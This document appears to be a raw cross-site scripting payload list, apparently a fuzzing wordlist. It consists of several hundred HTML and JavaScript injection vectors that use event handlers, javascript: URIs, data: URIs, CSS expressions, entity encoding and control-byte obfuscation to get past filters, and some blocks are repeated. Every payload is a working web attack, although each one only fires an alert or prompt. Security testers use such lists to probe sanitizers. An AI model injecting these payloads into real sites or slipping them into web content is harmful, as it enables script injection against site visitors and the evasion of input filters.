<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<var onmouseover="prompt(1)">On Mouse Over</var>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<form><button formaction=javascript&colon;alert(1)>CLICKME
%253cscript%253ealert(1)%253c/script%253e
foo<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>alert("XSS");</script>&search=1
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<embed src="javascript:alert(1)">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script src="#">{alert(1)}</script>;1
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<svg xmlns="#"><script>alert(1)</script></svg>
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
<script>alert(1)</script>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
<script>for((i)in(self))eval(i)(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
<sCR<script>iPt>alert(1)</SCr</script>IPt>
<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";
<iframe  src="&Tab;javascript:prompt(1)&Tab;">
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt >alert&lpar;1&rpar; {Opera}
<img/src=`` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=``&NewLine; onerror=alert(1)&NewLine;
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<script /**/>/**/alert(1)/**/</script /**/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe// src=javaSCRIPT&colon;alert(1)
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<var onmouseover="prompt(1)">On Mouse Over</var>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
